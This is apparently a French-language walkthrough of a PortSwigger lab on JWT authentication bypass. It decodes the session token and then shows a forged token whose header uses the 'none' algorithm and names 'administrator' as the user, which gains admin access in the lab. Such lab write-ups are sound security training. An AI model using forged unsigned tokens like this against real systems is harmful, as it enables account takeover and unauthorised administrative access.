# Lab

https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification

## Solution

Quand on se connecte sur le lab, on a un JWT dans un cookie.

```
eyJraWQiOiI3ZTdkOTYwZi05Y2MxLTQwMTYtOThlNS1lZTQ3YzUxNDlkMGQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTcwMjUwNjkwNn0.WxG5mnhcDrpWvGwRLzSxeaGBGuYw9nL2JB0w9-NjcNg6bbykEw6hB7EGUwhdTAIx4eaZRmDcfqB7cTtRamzb-ccfV2vojJNy3JWPQVgy36GyorsIaiHiaXvdNV161MolelyTsBf6JQjrMaAF6zSOGhyCBGunI4FQ4U5fT3iss09xLjm3rLRWTfxuP-efr4Ts1GsM6pi8LHufSygZqaVzwtnNOaZzLJMiI3jHYTh3285BpVt9Rpne3XZiMA6EF29soihBtzyYZBAngw4D3F7Tot_QDqVo0WRDVvtMHnCKGtAR-UEdp0_W6SBktNl09aAqjex1Bl68OfPtoe9VacmwnA
```

Le body du JWT décodé est le suivant :

```json
{
  "iss": "portswigger",
  "sub": "wiener",
  "exp": 1702506906
}
```

Si on change le body pour mettre en `sub` le nom `administrator`, le token n'est pas valide car la signature est vérifiée.

En revanche, on peut faire une attaque `none algorithm` en changeant le header du JWT :

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE3MDI1MDc1Mzd9.

{
    "typ": "JWT",
    "alg": "none"
}

{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1702506906
}
```

Et là, le token est valide et on a accès à la page d'administration pour supprimer l'utilisateur `carlos` et valider le lab.


